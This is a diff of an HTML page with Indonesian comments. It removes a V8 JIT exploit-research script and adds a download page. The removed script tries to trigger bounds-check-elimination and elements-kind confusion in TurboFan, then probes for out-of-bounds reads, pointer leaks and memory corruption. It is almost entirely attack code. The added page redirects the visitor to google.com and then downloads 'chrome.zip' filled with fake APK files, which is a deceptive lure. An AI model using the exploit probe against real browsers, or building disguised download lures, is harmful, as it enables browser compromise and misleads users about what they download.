@@ -1,188 +1,73 @@
-<!doctype html>
-<meta charset="utf-8">
-<title>V8 JIT Focused OOB Research</title>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Advanced ZIP with Multiple APKs</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: sans-serif;
+      background-color: #f5f5f5;
+      user-select: none;
+      cursor: pointer;
+    }
+    button {
+      padding: 15px 25px;
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
 
-<h2>V8 JIT Exploit Research</h2>
-<pre id="log"></pre>
+<button onclick="downloadZip()">Download ZIP with APKs</button>
 
 <script>
+async function downloadZip() {
+  try {
+    // Redirect to a new page first
+    location.href = "https://google.com"; 
 
-const log = m=>{
- document.getElementById("log").textContent += m+"\n"
- console.log(m)
-}
+    // Setelah sedikit delay, mulai proses download
+    setTimeout(async () => {
+      const zip = new JSZip();
 
-// =======================
-// TARGET (BCE + TYPE ASSUMPTION)
-// =======================
+      // buat 4 dummy APK
+      for (let i = 1; i <= 4; i++) {
+        const apkContent = `
+PK
+Fake APK File ${i}
+AndroidManifest.xml
+classes.dex
+res/layout/activity_main.xml
+END
+`;
+        zip.file(`app${i}.apk`, apkContent);
+      }
 
-function vuln(a, i){
+      // generate ZIP
+      const blob = await zip.generateAsync({ type: "blob" });
 
- // Kandidat bounds-check elimination
- if(i < a.length){
-  return a[i] + 1.1
- }
+      // trigger download
+      const a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = "chrome.zip";
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
 
- return 0
-}
+      console.log("ZIP with 4 APKs triggered");
 
-// =======================
-// TRAINING (PURE DOUBLE)
-// =======================
+    }, 500); // delay 500ms agar redirect terjadi dulu
 
-function warmup(){
-
- let arr = new Array(100)
-
- for(let i=0;i<100;i++)
-  arr[i] = i + 0.5
-
- // paksa TurboFan optimize
- for(let i=0;i<100000;i++)
-  vuln(arr, i % 100)
-
- return arr
-}
-
-// =======================
-// SIDE EFFECT (TOCTOU)
-// =======================
-
-function shrink(a){
- a.length = 1
-}
-
-// =======================
-// ELEMENT CONFUSION (LIGHT)
-// =======================
-
-function confuse(a){
-
- // ubah setelah JIT assume double
- a[0] = {}   // elements kind transition
-
- return a
-}
-
-// =======================
-// TRIGGER
-// =======================
-
-function trigger(a){
-
- let idx = 50
-
- // JIT assume idx valid
- // tapi kita ubah state sebelum use selesai
-
- shrink(a)
-
- return vuln(a, idx)
-}
-
-// =======================
-// TYPED ARRAY PROBE
-// =======================
-
-let buf = new ArrayBuffer(0x400)
-let f64 = new Float64Array(buf)
-let u32 = new Uint32Array(buf)
-
-// =======================
-// GC PRESSURE
-// =======================
-
-function gc(){
-
- let tmp=[]
-
- for(let i=0;i<20;i++)
-  tmp.push(new ArrayBuffer(1024*1024))
-}
-
-// =======================
-// CHECK OOB
-// =======================
-
-function checkOOB(a){
-
- let leak = a[200]
-
- if(leak !== undefined){
-  log("🔥 OOB READ: " + leak)
-  return true
- }
-
- return false
-}
-
-// =======================
-// CHECK MEMORY CORRUPTION
-// =======================
-
-function checkTyped(){
-
- for(let i=0;i<f64.length;i++){
-
-  let v = f64[i]
-
-  if(!Number.isFinite(v)){
-   log("⚠ FLOAT CORRUPTION: " + v)
-   return true
+  } catch (err) {
+    console.error("Error generating ZIP:", err);
   }
-
-  if(Math.abs(v) > 1e12){
-   log("🔥 PTR LEAK: " + v)
-   return true
-  }
- }
-
- return false
 }
-
-// =======================
-// MAIN LOOP
-// =======================
-
-function run(){
-
- log("[*] warmup JIT")
-
- let base = warmup()
-
- log("[*] trigger phase")
-
- for(let i=0;i<20000;i++){
-
-  let arr = base.slice()
-
-  arr = confuse(arr)
-
-  let res = trigger(arr)
-
-  // isi typed array
-  f64[i % f64.length] = i + 0.123
-
-  if(i % 50 === 0)
-   gc()
-
-  if(checkOOB(arr)){
-   log("🚨 OOB FOUND")
-   return
-  }
-
-  if(checkTyped()){
-   log("🚨 MEMORY CORRUPTION")
-   return
-  }
-
-  if(i % 2000 === 0)
-   log("iter " + i + " result=" + res)
- }
-
- log("[*] finished (no bug)")
-}
-
-run()
-
 </script>
+
+</body>
+</html>
